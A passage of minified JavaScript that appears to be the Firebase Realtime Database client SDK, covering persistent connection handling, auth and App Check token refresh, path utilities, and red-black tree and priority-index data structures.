trying to upgrade."),this.secondaryConn_.close())},Math.floor(Fk))}onReset_(e){this.log_("Reset packet received.  New host: "+e),this.repoInfo_.host=e,this.state_===1?this.close():(this.closeConnections_(),this.start_())}onConnectionEstablished_(e,n){this.log_("Realtime connection established."),this.conn_=e,this.state_=1,this.onReady_&&(this.onReady_(n,this.sessionId),this.onReady_=null),this.primaryResponsesRequired_===0?(this.log_("Primary connection is healthy."),this.isHealthy_=!0):ss(()=>{this.sendPingOnPrimaryIfNecessary_()},Math.floor(Lk))}sendPingOnPrimaryIfNecessary_(){!this.isHealthy_&&this.state_===1&&(this.log_("sending ping on primary."),this.sendData_({t:"c",d:{t:Kw,d:{}}}))}onSecondaryConnectionLost_(){let e=this.secondaryConn_;this.secondaryConn_=null,(this.tx_===e||this.rx_===e)&&this.close()}onConnectionLost_(e){this.conn_=null,!e&&this.state_===0?(this.log_("Realtime connection failed."),this.repoInfo_.isCacheableHost()&&(ur.remove("host:"+this.repoInfo_.host),this.repoInfo_.internalHost=this.repoInfo_.host)):this.state_===1&&this.log_("Realtime connection lost."),this.close()}onConnectionShutdown_(e){this.log_("Connection shutdown command received. Shutting down..."),this.onKill_&&(this.onKill_(e),this.onKill_=null),this.onDisconnect_=null,this.close()}sendData_(e){if(this.state_!==1)throw"Connection is not connected";this.tx_.send(e)}close(){this.state_!==2&&(this.log_("Closing realtime connection."),this.state_=2,this.closeConnections_(),this.onDisconnect_&&(this.onDisconnect_(),this.onDisconnect_=null))}closeConnections_(){this.log_("Shutting down all connections"),this.conn_&&(this.conn_.close(),this.conn_=null),this.secondaryConn_&&(this.secondaryConn_.close(),this.secondaryConn_=null),this.healthyTimeout_&&(clearTimeout(this.healthyTimeout_),this.healthyTimeout_=null)}};var Jc=class{put(e,n,r,i){}merge(e,n,r,i){}refreshAuthToken(e){}refreshAppCheckToken(e){}onDisconnectPut(e,n,r){}onDisconnectMerge(e,n,r){}onDisconnectCancel(e,n){}reportStats(e){}};var Xc=class{constructor(e){this.allowedEvents_=e,this.listeners_={},m(Array.isArray(e)&&e.length>0,"Requires a non-empty array")}trigger(e,...n){if(Array.isArray(this.listeners_[e])){let r=[...this.listeners_[e]];for(let i=0;i<r.length;i++)r[i].callback.apply(r[i].context,n)}}on(e,n,r){this.validateEventType_(e),this.listeners_[e]=this.listeners_[e]||[],this.listeners_[e].push({callback:n,context:r});let i=this.getInitialEvent(e);i&&n.apply(r,i)}off(e,n,r){this.validateEventType_(e);let i=this.listeners_[e]||[];for(let o=0;o<i.length;o++)if(i[o].callback===n&&(!r||r===i[o].context)){i.splice(o,1);return}}validateEventType_(e){m(this.allowedEvents_.find(n=>n===e),"Unknown event: "+e)}};var el=class t extends Xc{constructor(){super(["online"]),this.online_=!0,typeof window<"u"&&typeof window.addEventListener<"u"&&!Vo()&&(window.addEventListener("online",()=>{this.online_||(this.online_=!0,this.trigger("online",!0))},!1),window.addEventListener("offline",()=>{this.online_&&(this.online_=!1,this.trigger("online",!1))},!1))}static getInstance(){return new t}getInitialEvent(e){return m(e==="online","Unknown event type: "+e),[this.online_]}currentlyOnline(){return this.online_}};var Zw=32,Qw=768,Q=class{constructor(e,n){if(n===void 0){this.pieces_=e.split("/");let r=0;for(let i=0;i<this.pieces_.length;i++)this.pieces_[i].length>0&&(this.pieces_[r]=this.pieces_[i],r++);this.pieces_.length=r,this.pieceNum_=0}else this.pieces_=e,this.pieceNum_=n}toString(){let e="";for(let n=this.pieceNum_;n<this.pieces_.length;n++)this.pieces_[n]!==""&&(e+="/"+this.pieces_[n]);return e||"/"}};function K(){return new Q("")}function F(t){return t.pieceNum_>=t.pieces_.length?null:t.pieces_[t.pieceNum_]}function Tn(t){return t.pieces_.length-t.pieceNum_}function X(t){let e=t.pieceNum_;return e<t.pieces_.length&&e++,new Q(t.pieces_,e)}function jE(t){return t.pieceNum_<t.pieces_.length?t.pieces_[t.pieces_.length-1]:null}function Hk(t){let e="";for(let n=t.pieceNum_;n<t.pieces_.length;n++)t.pieces_[n]!==""&&(e+="/"+encodeURIComponent(String(t.pieces_[n])));return e||"/"}function UE(t,e=0){return t.pieces_.slice(t.pieceNum_+e)}function BE(t){if(t.pieceNum_>=t.pieces_.length)return null;let e=[];for(let n=t.pieceNum_;n<t.pieces_.length-1;n++)e.push(t.pieces_[n]);return new Q(e,0)}function de(t,e){let n=[];for(let r=t.pieceNum_;r<t.pieces_.length;r++)n.push(t.pieces_[r]);if(e instanceof Q)for(let r=e.pieceNum_;r<e.pieces_.length;r++)n.push(e.pieces_[r]);else{let r=e.split("/");for(let i=0;i<r.length;i++)r[i].length>0&&n.push(r[i])}return new Q(n,0)}function L(t){return t.pieceNum_>=t.pieces_.length}function Ye(t,e){let n=F(t),r=F(e);if(n===null)return e;if(n===r)return Ye(X(t),X(e));throw new Error("INTERNAL ERROR: innerPath ("+e+") is not within outerPath ("+t+")")}function $E(t,e){if(Tn(t)!==Tn(e))return!1;for(let n=t.pieceNum_,r=e.pieceNum_;n<=t.pieces_.length;n++,r++)if(t.pieces_[n]!==e.pieces_[r])return!1;return!0}function at(t,e){let n=t.pieceNum_,r=e.pieceNum_;if(Tn(t)>Tn(e))return!1;for(;n<t.pieces_.length;){if(t.pieces_[n]!==e.pieces_[r])return!1;++n,++r}return!0}var ep=class{constructor(e,n){this.errorPrefix_=n,this.parts_=UE(e,0),this.byteLength_=Math.max(1,this.parts_.length);for(let r=0;r<this.parts_.length;r++)this.byteLength_+=Bo(this.parts_[r]);HE(this)}};function Wk(t,e){t.parts_.length>0&&(t.byteLength_+=1),t.parts_.push(e),t.byteLength_+=Bo(e),HE(t)}function zk(t){let e=t.parts_.pop();t.byteLength_-=Bo(e),t.parts_.length>0&&(t.byteLength_-=1)}function HE(t){if(t.byteLength_>Qw)throw new Error(t.errorPrefix_+"has a key path longer than "+Qw+" bytes ("+t.byteLength_+").");if(t.parts_.length>Zw)throw new Error(t.errorPrefix_+"path specified exceeds the maximum depth that can be written ("+Zw+") or object contains a cycle "+lr(t))}function lr(t){return t.parts_.length===0?"":"in property '"+t.parts_.join(".")+"'"}var tp=class t extends Xc{constructor(){super(["visible"]);let e,n;typeof document<"u"&&typeof document.addEventListener<"u"&&(typeof document.hidden<"u"?(n="visibilitychange",e="hidden"):typeof document.mozHidden<"u"?(n="mozvisibilitychange",e="mozHidden"):typeof document.msHidden<"u"?(n="msvisibilitychange",e="msHidden"):typeof document.webkitHidden<"u"&&(n="webkitvisibilitychange",e="webkitHidden")),this.visible_=!0,n&&document.addEventListener(n,()=>{let r=!document[e];r!==this.visible_&&(this.visible_=r,this.trigger("visible",r))},!1)}static getInstance(){return new t}getInitialEvent(e){return m(e==="visible","Unknown event type: "+e),[this.visible_]}};var rs=1e3,Gk=60*5*1e3,Jw=30*1e3,qk=1.3,Yk=3e4,Kk="server_kill",Xw=3,kp=(()=>{class t extends Jc{constructor(n,r,i,o,s,a,c,l){if(super(),this.repoInfo_=n,this.applicationId_=r,this.onDataUpdate_=i,this.onConnectStatus_=o,this.onServerInfoUpdate_=s,this.authTokenProvider_=a,this.appCheckTokenProvider_=c,this.authOverride_=l,this.id=t.nextPersistentConnectionId_++,this.log_=ps("p:"+this.id+":"),this.interruptReasons_={},this.listens=new Map,this.outstandingPuts_=[],this.outstandingGets_=[],this.outstandingPutCount_=0,this.outstandingGetCount_=0,this.onDisconnectRequestQueue_=[],this.connected_=!1,this.reconnectDelay_=rs,this.maxReconnectDelay_=Gk,this.securityDebugCallback_=null,this.lastSessionId=null,this.establishConnectionTimer_=null,this.visible_=!1,this.requestCBHash_={},this.requestNumber_=0,this.realtime_=null,this.authToken_=null,this.appCheckToken_=null,this.forceTokenRefresh_=!1,this.invalidAuthTokenCount_=0,this.invalidAppCheckTokenCount_=0,this.firstConnection_=!0,this.lastConnectionAttemptTime_=null,this.lastConnectionEstablishedTime_=null,l&&!yt())throw new Error("Auth override specified in options, but not supported on non Node.js platforms");tp.getInstance().on("visible",this.onVisible_,this),n.host.indexOf("fblocal")===-1&&el.getInstance().on("online",this.onOnline_,this)}sendRequest(n,r,i){let o=++this.requestNumber_,s={r:o,a:n,b:r};this.log_(he(s)),m(this.connected_,"sendRequest call when we're not connected not allowed."),this.realtime_.sendRequest(s),i&&(this.requestCBHash_[o]=i)}get(n){this.initConnection_();let r=new yn,o={action:"g",request:{p:n._path.toString(),q:n._queryObject},onComplete:a=>{let c=a.d;a.s==="ok"?r.resolve(c):r.reject(c)}};this.outstandingGets_.push(o),this.outstandingGetCount_++;let s=this.outstandingGets_.length-1;return this.connected_&&this.sendGet_(s),r.promise}listen(n,r,i,o){this.initConnection_();let s=n._queryIdentifier,a=n._path.toString();this.log_("Listen called for "+a+" "+s),this.listens.has(a)||this.listens.set(a,new Map),m(n._queryParams.isDefault()||!n._queryParams.loadsAllData(),"listen() called for non-default but complete query"),m(!this.listens.get(a).has(s),"listen() called twice for same path/queryId.");let c={onComplete:o,hashFn:r,query:n,tag:i};this.listens.get(a).set(s,c),this.connected_&&this.sendListen_(c)}sendGet_(n){let r=this.outstandingGets_[n];this.sendRequest("g",r.request,i=>{delete this.outstandingGets_[n],this.outstandingGetCount_--,this.outstandingGetCount_===0&&(this.outstandingGets_=[]),r.onComplete&&r.onComplete(i)})}sendListen_(n){let r=n.query,i=r._path.toString(),o=r._queryIdentifier;this.log_("Listen on "+i+" for "+o);let s={p:i},a="q";n.tag&&(s.q=r._queryObject,s.t=n.tag),s.h=n.hashFn(),this.sendRequest(a,s,c=>{let l=c.d,u=c.s;t.warnOnListenWarnings_(l,r),(this.listens.get(i)&&this.listens.get(i).get(o))===n&&(this.log_("listen response",c),u!=="ok"&&this.removeListen_(i,o),n.onComplete&&n.onComplete(u,l))})}static warnOnListenWarnings_(n,r){if(n&&typeof n=="object"&&_t(n,"w")){let i=Xn(n,"w");if(Array.isArray(i)&&~i.indexOf("no_index")){let o='".indexOn": "'+r._queryParams.getIndex().toString()+'"',s=r._path.toString();Oe(`Using an unspecified index. Your data will be downloaded and filtered on the client. Consider adding ${o} at ${s} to your security rules for better performance.`)}}}refreshAuthToken(n){this.authToken_=n,this.log_("Auth token refreshed"),this.authToken_?this.tryAuth():this.connected_&&this.sendRequest("unauth",{},()=>{}),this.reduceReconnectDelayIfAdminCredential_(n)}reduceReconnectDelayIfAdminCredential_(n){(n&&n.length===40||MI(n))&&(this.log_("Admin auth credential detected.  Reducing max reconnect time."),this.maxReconnectDelay_=Jw)}refreshAppCheckToken(n){this.appCheckToken_=n,this.log_("App check token refreshed"),this.appCheckToken_?this.tryAppCheck():this.connected_&&this.sendRequest("unappeck",{},()=>{})}tryAuth(){if(this.connected_&&this.authToken_){let n=this.authToken_,r=AI(n)?"auth":"gauth",i={cred:n};this.authOverride_===null?i.noauth=!0:typeof this.authOverride_=="object"&&(i.authvar=this.authOverride_),this.sendRequest(r,i,o=>{let s=o.s,a=o.d||"error";this.authToken_===n&&(s==="ok"?this.invalidAuthTokenCount_=0:this.onAuthRevoked_(s,a))})}}tryAppCheck(){this.connected_&&this.appCheckToken_&&this.sendRequest("appcheck",{token:this.appCheckToken_},n=>{let r=n.s,i=n.d||"error";r==="ok"?this.invalidAppCheckTokenCount_=0:this.onAppCheckRevoked_(r,i)})}unlisten(n,r){let i=n._path.toString(),o=n._queryIdentifier;this.log_("Unlisten called for "+i+" "+o),m(n._queryParams.isDefault()||!n._queryParams.loadsAllData(),"unlisten() called for non-default but complete query"),this.removeListen_(i,o)&&this.connected_&&this.sendUnlisten_(i,o,n._queryObject,r)}sendUnlisten_(n,r,i,o){this.log_("Unlisten on "+n+" for "+r);let s={p:n},a="n";o&&(s.q=i,s.t=o),this.sendRequest(a,s)}onDisconnectPut(n,r,i){this.initConnection_(),this.connected_?this.sendOnDisconnect_("o",n,r,i):this.onDisconnectRequestQueue_.push({pathString:n,action:"o",data:r,onComplete:i})}onDisconnectMerge(n,r,i){this.initConnection_(),this.connected_?this.sendOnDisconnect_("om",n,r,i):this.onDisconnectRequestQueue_.push({pathString:n,action:"om",data:r,onComplete:i})}onDisconnectCancel(n,r){this.initConnection_(),this.connected_?this.sendOnDisconnect_("oc",n,null,r):this.onDisconnectRequestQueue_.push({pathString:n,action:"oc",data:null,onComplete:r})}sendOnDisconnect_(n,r,i,o){let s={p:r,d:i};this.log_("onDisconnect "+n,s),this.sendRequest(n,s,a=>{o&&setTimeout(()=>{o(a.s,a.d)},Math.floor(0))})}put(n,r,i,o){this.putInternal("p",n,r,i,o)}merge(n,r,i,o){this.putInternal("m",n,r,i,o)}putInternal(n,r,i,o,s){this.initConnection_();let a={p:r,d:i};s!==void 0&&(a.h=s),this.outstandingPuts_.push({action:n,request:a,onComplete:o}),this.outstandingPutCount_++;let c=this.outstandingPuts_.length-1;this.connected_?this.sendPut_(c):this.log_("Buffering put: "+r)}sendPut_(n){let r=this.outstandingPuts_[n].action,i=this.outstandingPuts_[n].request,o=this.outstandingPuts_[n].onComplete;this.outstandingPuts_[n].queued=this.connected_,this.sendRequest(r,i,s=>{this.log_(r+" response",s),delete this.outstandingPuts_[n],this.outstandingPutCount_--,this.outstandingPutCount_===0&&(this.outstandingPuts_=[]),o&&o(s.s,s.d)})}reportStats(n){if(this.connected_){let r={c:n};this.log_("reportStats",r),this.sendRequest("s",r,i=>{if(i.s!=="ok"){let s=i.d;this.log_("reportStats","Error sending stats: "+s)}})}}onDataMessage_(n){if("r"in n){this.log_("from server: "+he(n));let r=n.r,i=this.requestCBHash_[r];i&&(delete this.requestCBHash_[r],i(n.b))}else{if("error"in n)throw"A server-side error has occurred: "+n.error;"a"in n&&this.onDataPush_(n.a,n.b)}}onDataPush_(n,r){this.log_("handleServerMessage",n,r),n==="d"?this.onDataUpdate_(r.p,r.d,!1,r.t):n==="m"?this.onDataUpdate_(r.p,r.d,!0,r.t):n==="c"?this.onListenRevoked_(r.p,r.q):n==="ac"?this.onAuthRevoked_(r.s,r.d):n==="apc"?this.onAppCheckRevoked_(r.s,r.d):n==="sd"?this.onSecurityDebugPacket_(r):zf("Unrecognized action received from server: "+he(n)+`
Are you using the latest client?`)}onReady_(n,r){this.log_("connection ready"),this.connected_=!0,this.lastConnectionEstablishedTime_=new Date().getTime(),this.handleTimestamp_(n),this.lastSessionId=r,this.firstConnection_&&this.sendConnectStats_(),this.restoreState_(),this.firstConnection_=!1,this.onConnectStatus_(!0)}scheduleConnect_(n){m(!this.realtime_,"Scheduling a connect when we're already connected/ing?"),this.establishConnectionTimer_&&clearTimeout(this.establishConnectionTimer_),this.establishConnectionTimer_=setTimeout(()=>{this.establishConnectionTimer_=null,this.establishConnection_()},Math.floor(n))}initConnection_(){!this.realtime_&&this.firstConnection_&&this.scheduleConnect_(0)}onVisible_(n){n&&!this.visible_&&this.reconnectDelay_===this.maxReconnectDelay_&&(this.log_("Window became visible.  Reducing delay."),this.reconnectDelay_=rs,this.realtime_||this.scheduleConnect_(0)),this.visible_=n}onOnline_(n){n?(this.log_("Browser went online."),this.reconnectDelay_=rs,this.realtime_||this.scheduleConnect_(0)):(this.log_("Browser went offline.  Killing connection."),this.realtime_&&this.realtime_.close())}onRealtimeDisconnect_(){if(this.log_("data client disconnected"),this.connected_=!1,this.realtime_=null,this.cancelSentTransactions_(),this.requestCBHash_={},this.shouldReconnect_()){this.visible_?this.lastConnectionEstablishedTime_&&(new Date().getTime()-this.lastConnectionEstablishedTime_>Yk&&(this.reconnectDelay_=rs),this.lastConnectionEstablishedTime_=null):(this.log_("Window isn't visible.  Delaying reconnect."),this.reconnectDelay_=this.maxReconnectDelay_,this.lastConnectionAttemptTime_=new Date().getTime());let n=new Date().getTime()-this.lastConnectionAttemptTime_,r=Math.max(0,this.reconnectDelay_-n);r=Math.random()*r,this.log_("Trying to reconnect in "+r+"ms"),this.scheduleConnect_(r),this.reconnectDelay_=Math.min(this.maxReconnectDelay_,this.reconnectDelay_*qk)}this.onConnectStatus_(!1)}establishConnection_(){return p(this,null,function*(){if(this.shouldReconnect_()){this.log_("Making a connection attempt"),this.lastConnectionAttemptTime_=new Date().getTime(),this.lastConnectionEstablishedTime_=null;let n=this.onDataMessage_.bind(this),r=this.onReady_.bind(this),i=this.onRealtimeDisconnect_.bind(this),o=this.id+":"+t.nextConnectionId_++,s=this.lastSessionId,a=!1,c=null,l=function(){c?c.close():(a=!0,i())},u=function(h){m(c,"sendRequest call when we're not connected not allowed."),c.sendRequest(h)};this.realtime_={close:l,sendRequest:u};let d=this.forceTokenRefresh_;this.forceTokenRefresh_=!1;try{let[h,f]=yield Promise.all([this.authTokenProvider_.getToken(d),this.appCheckTokenProvider_.getToken(d)]);a?Ee("getToken() completed but was canceled"):(Ee("getToken() completed. Creating connection."),this.authToken_=h&&h.accessToken,this.appCheckToken_=f&&f.token,c=new Xf(o,this.repoInfo_,this.applicationId_,this.appCheckToken_,this.authToken_,n,r,i,g=>{Oe(g+" ("+this.repoInfo_.toString()+")"),this.interrupt(Kk)},s))}catch(h){this.log_("Failed to get token: "+h),a||(this.repoInfo_.nodeAdmin&&Oe(h),l())}}})}interrupt(n){Ee("Interrupting connection for reason: "+n),this.interruptReasons_[n]=!0,this.realtime_?this.realtime_.close():(this.establishConnectionTimer_&&(clearTimeout(this.establishConnectionTimer_),this.establishConnectionTimer_=null),this.connected_&&this.onRealtimeDisconnect_())}resume(n){Ee("Resuming connection for reason: "+n),delete this.interruptReasons_[n],jo(this.interruptReasons_)&&(this.reconnectDelay_=rs,this.realtime_||this.scheduleConnect_(0))}handleTimestamp_(n){let r=n-new Date().getTime();this.onServerInfoUpdate_({serverTimeOffset:r})}cancelSentTransactions_(){for(let n=0;n<this.outstandingPuts_.length;n++){let r=this.outstandingPuts_[n];r&&"h"in r.request&&r.queued&&(r.onComplete&&r.onComplete("disconnect"),delete this.outstandingPuts_[n],this.outstandingPutCount_--)}this.outstandingPutCount_===0&&(this.outstandingPuts_=[])}onListenRevoked_(n,r){let i;r?i=r.map(s=>Op(s)).join("$"):i="default";let o=this.removeListen_(n,i);o&&o.onComplete&&o.onComplete("permission_denied")}removeListen_(n,r){let i=new Q(n).toString(),o;if(this.listens.has(i)){let s=this.listens.get(i);o=s.get(r),s.delete(r),s.size===0&&this.listens.delete(i)}else o=void 0;return o}onAuthRevoked_(n,r){Ee("Auth token revoked: "+n+"/"+r),this.authToken_=null,this.forceTokenRefresh_=!0,this.realtime_.close(),(n==="invalid_token"||n==="permission_denied")&&(this.invalidAuthTokenCount_++,this.invalidAuthTokenCount_>=Xw&&(this.reconnectDelay_=Jw,this.authTokenProvider_.notifyForInvalidToken()))}onAppCheckRevoked_(n,r){Ee("App check token revoked: "+n+"/"+r),this.appCheckToken_=null,this.forceTokenRefresh_=!0,(n==="invalid_token"||n==="permission_denied")&&(this.invalidAppCheckTokenCount_++,this.invalidAppCheckTokenCount_>=Xw&&this.appCheckTokenProvider_.notifyForInvalidToken())}onSecurityDebugPacket_(n){this.securityDebugCallback_?this.securityDebugCallback_(n):"msg"in n&&console.log("FIREBASE: "+n.msg.replace(`
`,`
FIREBASE: `))}restoreState_(){this.tryAuth(),this.tryAppCheck();for(let n of this.listens.values())for(let r of n.values())this.sendListen_(r);for(let n=0;n<this.outstandingPuts_.length;n++)this.outstandingPuts_[n]&&this.sendPut_(n);for(;this.onDisconnectRequestQueue_.length;){let n=this.onDisconnectRequestQueue_.shift();this.sendOnDisconnect_(n.action,n.pathString,n.data,n.onComplete)}for(let n=0;n<this.outstandingGets_.length;n++)this.outstandingGets_[n]&&this.sendGet_(n)}sendConnectStats_(){let n={},r="js";yt()&&(this.repoInfo_.nodeAdmin?r="admin_node":r="node"),n["sdk."+r+"."+xp.replace(/\./g,"-")]=1,Vo()?n["framework.cordova"]=1:Cc()&&(n["framework.reactnative"]=1),this.reportStats(n)}shouldReconnect_(){let n=el.getInstance().currentlyOnline();return jo(this.interruptReasons_)&&n}}t.nextPersistentConnectionId_=0,t.nextConnectionId_=0;return t})(),U=class t{constructor(e,n){this.name=e,this.node=n}static Wrap(e,n){return new t(e,n)}};var Ai=class{getCompare(){return this.compare.bind(this)}indexedValueChanged(e,n){let r=new U(Ti,e),i=new U(Ti,n);return this.compare(r,i)!==0}minPost(){return U.MIN}};var Yc,tl=class extends Ai{static get __EMPTY_NODE(){return Yc}static set __EMPTY_NODE(e){Yc=e}compare(e,n){return Oi(e.name,n.name)}isDefinedOn(e){throw Jn("KeyIndex.isDefinedOn not expected to be called.")}indexedValueChanged(e,n){return!1}minPost(){return U.MIN}maxPost(){return new U(fr,Yc)}makePost(e,n){return m(typeof e=="string","KeyIndex indexValue must always be a string."),new U(e,Yc)}toString(){return".key"}},Si=new tl;var Di=class{constructor(e,n,r,i,o=null){this.isReverse_=i,this.resultGenerator_=o,this.nodeStack_=[];let s=1;for(;!e.isEmpty();)if(e=e,s=n?r(e.key,n):1,i&&(s*=-1),s<0)this.isReverse_?e=e.left:e=e.right;else if(s===0){this.nodeStack_.push(e);break}else this.nodeStack_.push(e),this.isReverse_?e=e.right:e=e.left}getNext(){if(this.nodeStack_.length===0)return null;let e=this.nodeStack_.pop(),n;if(this.resultGenerator_?n=this.resultGenerator_(e.key,e.value):n={key:e.key,value:e.value},this.isReverse_)for(e=e.left;!e.isEmpty();)this.nodeStack_.push(e),e=e.right;else for(e=e.right;!e.isEmpty();)this.nodeStack_.push(e),e=e.left;return n}hasNext(){return this.nodeStack_.length>0}peek(){if(this.nodeStack_.length===0)return null;let e=this.nodeStack_[this.nodeStack_.length-1];return this.resultGenerator_?this.resultGenerator_(e.key,e.value):{key:e.key,value:e.value}}},st=(()=>{class t{constructor(n,r,i,o,s){this.key=n,this.value=r,this.color=i??t.RED,this.left=o??Ke.EMPTY_NODE,this.right=s??Ke.EMPTY_NODE}copy(n,r,i,o,s){return new t(n??this.key,r??this.value,i??this.color,o??this.left,s??this.right)}count(){return this.left.count()+1+this.right.count()}isEmpty(){return!1}inorderTraversal(n){return this.left.inorderTraversal(n)||!!n(this.key,this.value)||this.right.inorderTraversal(n)}reverseTraversal(n){return this.right.reverseTraversal(n)||n(this.key,this.value)||this.left.reverseTraversal(n)}min_(){return this.left.isEmpty()?this:this.left.min_()}minKey(){return this.min_().key}maxKey(){return this.right.isEmpty()?this.key:this.right.maxKey()}insert(n,r,i){let o=this,s=i(n,o.key);return s<0?o=o.copy(null,null,null,o.left.insert(n,r,i),null):s===0?o=o.copy(null,r,null,null,null):o=o.copy(null,null,null,null,o.right.insert(n,r,i)),o.fixUp_()}removeMin_(){if(this.left.isEmpty())return Ke.EMPTY_NODE;let n=this;return!n.left.isRed_()&&!n.left.left.isRed_()&&(n=n.moveRedLeft_()),n=n.copy(null,null,null,n.left.removeMin_(),null),n.fixUp_()}remove(n,r){let i,o;if(i=this,r(n,i.key)<0)!i.left.isEmpty()&&!i.left.isRed_()&&!i.left.left.isRed_()&&(i=i.moveRedLeft_()),i=i.copy(null,null,null,i.left.remove(n,r),null);else{if(i.left.isRed_()&&(i=i.rotateRight_()),!i.right.isEmpty()&&!i.right.isRed_()&&!i.right.left.isRed_()&&(i=i.moveRedRight_()),r(n,i.key)===0){if(i.right.isEmpty())return Ke.EMPTY_NODE;o=i.right.min_(),i=i.copy(o.key,o.value,null,null,i.right.removeMin_())}i=i.copy(null,null,null,null,i.right.remove(n,r))}return i.fixUp_()}isRed_(){return this.color}fixUp_(){let n=this;return n.right.isRed_()&&!n.left.isRed_()&&(n=n.rotateLeft_()),n.left.isRed_()&&n.left.left.isRed_()&&(n=n.rotateRight_()),n.left.isRed_()&&n.right.isRed_()&&(n=n.colorFlip_()),n}moveRedLeft_(){let n=this.colorFlip_();return n.right.left.isRed_()&&(n=n.copy(null,null,null,null,n.right.rotateRight_()),n=n.rotateLeft_(),n=n.colorFlip_()),n}moveRedRight_(){let n=this.colorFlip_();return n.left.left.isRed_()&&(n=n.rotateRight_(),n=n.colorFlip_()),n}rotateLeft_(){let n=this.copy(null,null,t.RED,null,this.right.left);return this.right.copy(null,null,this.color,n,null)}rotateRight_(){let n=this.copy(null,null,t.RED,this.left.right,null);return this.left.copy(null,null,this.color,null,n)}colorFlip_(){let n=this.left.copy(null,null,!this.left.color,null,null),r=this.right.copy(null,null,!this.right.color,null,null);return this.copy(null,null,!this.color,n,r)}checkMaxDepth_(){let n=this.check_();return Math.pow(2,n)<=this.count()+1}check_(){if(this.isRed_()&&this.left.isRed_())throw new Error("Red node has red child("+this.key+","+this.value+")");if(this.right.isRed_())throw new Error("Right child of ("+this.key+","+this.value+") is red");let n=this.left.check_();if(n!==this.right.check_())throw new Error("Black depths differ");return n+(this.isRed_()?0:1)}}return t.RED=!0,t.BLACK=!1,t})(),np=class{copy(e,n,r,i,o){return this}insert(e,n,r){return new st(e,n,null)}remove(e,n){return this}count(){return 0}isEmpty(){return!0}inorderTraversal(e){return!1}reverseTraversal(e){return!1}minKey(){return null}maxKey(){return null}check_(){return 0}isRed_(){return!1}},Ke=class t{constructor(e,n=t.EMPTY_NODE){this.comparator_=e,this.root_=n}insert(e,n){return new t(this.comparator_,this.root_.insert(e,n,this.comparator_).copy(null,null,st.BLACK,null,null))}remove(e){return new t(this.comparator_,this.root_.remove(e,this.comparator_).copy(null,null,st.BLACK,null,null))}get(e){let n,r=this.root_;for(;!r.isEmpty();){if(n=this.comparator_(e,r.key),n===0)return r.value;n<0?r=r.left:n>0&&(r=r.right)}return null}getPredecessorKey(e){let n,r=this.root_,i=null;for(;!r.isEmpty();)if(n=this.comparator_(e,r.key),n===0){if(r.left.isEmpty())return i?i.key:null;for(r=r.left;!r.right.isEmpty();)r=r.right;return r.key}else n<0?r=r.left:n>0&&(i=r,r=r.right);throw new Error("Attempted to find predecessor key for a nonexistent key.  What gives?")}isEmpty(){return this.root_.isEmpty()}count(){return this.root_.count()}minKey(){return this.root_.minKey()}maxKey(){return this.root_.maxKey()}inorderTraversal(e){return this.root_.inorderTraversal(e)}reverseTraversal(e){return this.root_.reverseTraversal(e)}getIterator(e){return new Di(this.root_,null,this.comparator_,!1,e)}getIteratorFrom(e,n){return new Di(this.root_,e,this.comparator_,!1,n)}getReverseIteratorFrom(e,n){return new Di(this.root_,e,this.comparator_,!0,n)}getReverseIterator(e){return new Di(this.root_,null,this.comparator_,!0,e)}};Ke.EMPTY_NODE=new np;function Zk(t,e){return Oi(t.name,e.name)}function Fp(t,e){return Oi(t,e)}var rp;function Qk(t){rp=t}var WE=function(t){return typeof t=="number"?"number:"+CE(t):"string:"+t},zE=function(t){if(t.isLeafNode()){let e=t.val();m(typeof e=="string"||typeof e=="number"||typeof e=="object"&&_t(e,".sv"),"Priority must be a string or number.")}else m(t===rp||t.isEmpty(),"priority of unexpected type.");m(t===rp||t.getPriority().isEmpty(),"Priority nodes can't have a priority of their own.")};var eE,Mi=(()=>{class t{constructor(n,r=t.__childrenNodeConstructor.EMPTY_NODE){this.value_=n,this.priorityNode_=r,this.lazyHash_=null,m(this.value_!==void 0&&this.value_!==null,"LeafNode shouldn't be created with null/undefined value."),zE(this.priorityNode_)}static set __childrenNodeConstructor(n){eE=n}static get __childrenNodeConstructor(){return eE}isLeafNode(){return!0}getPriority(){return this.priorityNode_}updatePriority(n){return new t(this.value_,n)}getImmediateChild(n){return n===".priority"?this.priorityNode_:t.__childrenNodeConstructor.EMPTY_NODE}getChild(n){return L(n)?this:F(n)===".priority"?this.priorityNode_:t.__childrenNodeConstructor.EMPTY_NODE}hasChild(){return!1}getPredecessorChildName(n,r){return null}updateImmediateChild(n,r){return n===".priority"?this.updatePriority(r):r.isEmpty()&&n!==".priority"?this:t.__childrenNodeConstructor.EMPTY_NODE.updateImmediateChild(n,r).updatePriority(this.priorityNode_)}updateChild(n,r){let i=F(n);return i===null?r:r.isEmpty()&&i!==".priority"?this:(m(i!==".priority"||Tn(n)===1,".priority must be the last token in a path"),this.updateImmediateChild(i,t.__childrenNodeConstructor.EMPTY_NODE.updateChild(X(n),r)))}isEmpty(){return!1}numChildren(){return 0}forEachChild(n,r){return!1}val(n){return n&&!this.getPriority().isEmpty()?{".value":this.getValue(),".priority":this.getPriority().val()}:this.getValue()}hash(){if(this.lazyHash_===null){let n="";this.priorityNode_.isEmpty()||(n+="priority:"+WE(this.priorityNode_.val())+":");let r=typeof this.value_;n+=r+":",r==="number"?n+=CE(this.value_):n+=this.value_,this.lazyHash_=IE(n)}return this.lazyHash_}getValue(){return this.value_}compareTo(n){return n===t.__childrenNodeConstructor.EMPTY_NODE?1:n instanceof t.__childrenNodeConstructor?-1:(m(n.isLeafNode(),"Unknown node type"),this.compareToLeafNode_(n))}compareToLeafNode_(n){let r=typeof n.value_,i=typeof this.value_,o=t.VALUE_TYPE_ORDER.indexOf(r),s=t.VALUE_TYPE_ORDER.indexOf(i);return m(o>=0,"Unknown leaf type: "+r),m(s>=0,"Unknown leaf type: "+i),o===s?i==="object"?0:this.value_<n.value_?-1:this.value_===n.value_?0:1:s-o}withIndex(){return this}isIndexed(){return!0}equals(n){if(n===this)return!0;if(n.isLeafNode()){let r=n;return this.value_===r.value_&&this.priorityNode_.equals(r.priorityNode_)}else return!1}}t.VALUE_TYPE_ORDER=["object","boolean","number","string"];return t})(),GE,qE;function Jk(t){GE=t}function Xk(t){qE=t}var ip=class extends Ai{compare(e,n){let r=e.node.getPriority(),i=n.node.getPriority(),o=r.compareTo(i);return o===0?Oi(e.name,n.name):o}isDefinedOn(e){return!e.getPriority().isEmpty()}indexedValueChanged(e,n){return!e.getPriority().equals(n.getPriority())}minPost(){return U.MIN}maxPost(){return new U(fr,new Mi("[PRIORITY-POST]",qE))}makePost(e,n){let r=GE(e);return new U(n,new Mi("[PRIORITY-POST]",r))}toString(){return".priority"}},Ce=new ip;var 